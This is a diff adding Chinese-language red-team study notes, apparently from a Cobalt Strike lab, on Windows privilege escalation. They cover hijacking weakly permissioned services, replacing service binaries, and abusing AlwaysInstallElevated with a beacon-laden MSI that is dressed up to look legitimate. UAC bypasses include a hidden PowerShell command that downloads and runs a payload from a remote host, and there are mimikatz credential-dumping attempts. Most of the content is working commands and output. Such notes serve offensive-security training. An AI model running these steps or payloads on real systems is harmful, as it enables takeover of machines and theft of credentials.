@@ -151,3 +151,206 @@ Cobalt Strike生成payload
 ```
 Attacks > Packages > Windows Executable (S) and selecting the Service Binary output type.
 ```
+
+# Weak Service Permissions
+弱服务权限
+
+枚举提权漏洞
+```
+execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
+```
+
+显示Service 2.exe Modifiable
+```
+=== Modifiable Services ===
+
+  Name             : Vuln-Service-2
+  DisplayName      : Vuln-Service-2
+  Description      : 
+  State            : Running
+  StartMode        : Auto
+  PathName         : "C:\Program Files\Vuln Services\Service 2.exe"
+```
+
+用[这个PS脚本](https://rohnspowershellblog.wordpress.com/2013/03/19/viewing-service-acls/)查看对上面程序的具体权限
+```
+beacon> powershell-import C:\Tools\Get-ServiceAcl.ps1
+beacon> powershell Get-ServiceAcl -Name Vuln-Service-2 | select -expandproperty Access
+
+ServiceRights     : ChangeConfig, Start, Stop
+AccessControlType : AccessAllowed
+IdentityReference : NT AUTHORITY\Authenticated Users
+IsInherited       : False
+InheritanceFlags  : None
+PropagationFlags  : None
+```
+
+显示有ChangeConfig, Start, Stop权限
+
+准备一个payload放在```C:\Temp\fake-service.exe```
+
+编辑指定上面服务的config二进制文件
+```
+beacon> run sc config Vuln-Service-2 binPath= C:\Temp\fake-service.exe
+[SC] ChangeServiceConfig SUCCESS
+```
+
+重启服务
+```
+beacon> run sc stop Vuln-Service-2
+beacon> run sc start Vuln-Service-2
+```
+
+连接shell
+```
+beacon> connect localhost 4444
+[+] established link to child beacon: 10.10.17.231
+```
+
+# Weak Service Binary Permissions
+
+直接替换服务的exe程序进行提权
+
+```
+powershell Get-Acl -Path "C:\Program Files\Vuln Services\Service 3.exe" | fl
+```
+
+
+使用```net helpmsg```命令查看报错信息
+```
+C:\>net helpmsg 32
+The process cannot access the file because it is being used by another process.
+```
+
+先停止程序，再替换，最后重启生效
+```
+beacon> run sc stop Vuln-Service-3
+beacon> upload C:\Payloads\Service 3.exe
+beacon> ls
+[*] Listing: C:\Program Files\Vuln Services\
+
+ Size     Type    Last Modified         Name
+ ----     ----    -------------         ----
+ 5kb      fil     02/23/2021 15:04:13   Service 1.exe
+ 5kb      fil     02/23/2021 15:04:13   Service 2.exe
+ 282kb    fil     03/03/2021 11:38:24   Service 3.exe
+
+beacon> run sc start Vuln-Service-3
+beacon> connect localhost 4444
+[+] established link to child beacon: 10.10.17.231
+```
+
+# Always Install Elevated
+
+下面两个值如果都是1，表示拥有以``` NT AUTHORITY\SYSTEM```身份运行或者安装```*.msi```文件的权限
+```
+beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
+
+=== AlwaysInstallElevated Registry Keys ===
+
+  HKLM:    1
+  HKCU:    1
+```
+
+制作msi程序
+
+1. Generate a new Windows EXE TCP payload and save it to C:\Payloads\beacon-tcp.exe.
+2. Open Visual Studio, select Create a new project and type "installer" into the search box. Select the Setup Wizard project and click Next.
+3. Give the project a name, like BeaconInstaller, use C:\Payloads for the location, select place solution and project in the same directory, and click Create.
+4. Keep clicking Next until you get to step 3 of 4 (choose files to include). Click Add and select the Beacon payload you just generated. Then click Finish.
+5. Highlight the BeaconInstaller project in the Solution Explorer and in the Properties, change TargetPlatform from x86 to x64.
+
+最终安装此 MSI 时，它将显示为目标上的已安装程序。
+
+您可以更改其他属性，例如作者和制造商，它们可以使安装的应用程序看起来更合法。
+
+1. 右键单击项目并选择View > Custom Actions。
+2. 右键单击安装并选择添加自定义操作。
+3. 双击Application Folder，选择您的beacon-tcp.exe文件，然后单击OK。这将确保在安装程序运行后立即执行信标有效负载。
+4. 在自定义操作属性下，将Run64Bit更改为True。
+
+
+
+上传并运行
+```
+beacon> cd C:\Temp
+beacon> upload C:\Payloads\BeaconInstaller\Debug\BeaconInstaller.msi
+beacon> run msiexec /i BeaconInstaller.msi /q /n
+beacon> connect localhost 4444
+[+] established link to child beacon: 10.10.17.231
+```
+
+# UAC Bypasses
+
+UAC绕过
+
+下面命令查询程序是否启用的UAC
+```
+execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Debug\Seatbelt.exe uac
+```
+
+UAC 绕过是一种技术，通过该技术，应用程序可以在不提示同意的情况下从 Medium转到High Integrity
+
+下面命令告知，当前账号是Medium状态的管理员，可以提升到High Integrity（完全管理员权限）
+```
+beacon> getuid
+[*] You are DEV\nlamb
+
+beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Debug\SharpUp.exe
+
+=== SharpUp: Running Privilege Escalation Checks ===
+
+[*] In medium integrity but user is a local administrator- UAC can be bypassed.
+```
+
+Cobalt Strike 提供了两种执行代码的方法来绕过 UAC。第一种是通过elevate命令，它通过所选技术引导侦听器。第二种是通过runasadmin命令，它允许您执行任意命令
+
+elevate
+```
+beacon> elevate uac-token-duplication tcp-4444-local
+[+] Success! Used token from PID 480
+[+] established link to child beacon: 10.10.17.132
+```
+
+
+runasadmin
+```
+beacon> runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
+```
+
+
+并非所有的 UAC 绕过都是一样的
+
+```TokenPrivileges```命令可以列举当前token特权
+
+使用 Token Duplication 获得的高完整性会话如下所示：
+
+```
+====== TokenPrivileges ======
+
+Current Token's Privileges
+
+                          SeShutdownPrivilege:  DISABLED
+                      SeChangeNotifyPrivilege:  SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
+                            SeUndockPrivilege:  DISABLED
+                SeIncreaseWorkingSetPrivilege:  DISABLED
+                          SeTimeZonePrivilege:  DISABLED
+```
+
+此时我们使用```logonpasswords```导出哈希仍然会提示没有权限
+```
+beacon> logonpasswords
+[*] Tasked beacon to run mimikatz's sekurlsa::logonpasswords command
+[+] host called home, sent: 296058 bytes
+[+] received output:
+ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)
+```
+
+这种情况下，即使我们是在high integrity session下，我们也无法绕过UAC。但是可以使用```elevate svc-exe```通过使用服务控制管理器以 SYSTEM 身份执行另一个 Beacon
+```
+beacon> elevate svc-exe tcp-4444-local
+Started service 96d0481 on .
+[+] established link to child beacon: 10.10.17.132
+```
+
+上面beacon的权限可以使用```logonpasswords```命令
